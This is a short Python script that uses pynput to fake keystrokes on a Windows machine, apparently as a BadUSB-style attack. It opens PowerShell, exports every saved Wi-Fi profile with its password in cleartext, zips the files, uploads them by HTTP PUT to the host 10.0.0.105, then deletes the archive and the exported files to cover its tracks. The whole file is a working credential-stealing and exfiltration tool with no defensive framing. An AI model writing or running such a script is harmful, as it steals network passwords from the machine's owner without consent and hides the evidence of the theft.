from pynput.keyboard import Key, Controller
import time

keyboard = Controller()


keyboard.press(Key.cmd)
keyboard.press('r')
keyboard.release(Key.cmd)
keyboard.release('r')


time.sleep(0.5)
keyboard.type('powershell')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)


time.sleep(0.5)
keyboard.type('netsh wlan export profile key=clear')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)

time.sleep(0.5)
keyboard.type('Compress-Archive -U -Path .\*.xml -DestinationPath temp.zip')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)

time.sleep(1)
keyboard.type(' Invoke-Restmethod -Uri http://10.0.0.105/temp.zip -Method Put -Infile temp.zip')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)

time.sleep(0.5)
keyboard.type('rm temp.zip')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)

time.sleep(0.5)
keyboard.type('rm .\*xml')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)

time.sleep(0.5)
keyboard.type('exit')

time.sleep(0.5)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
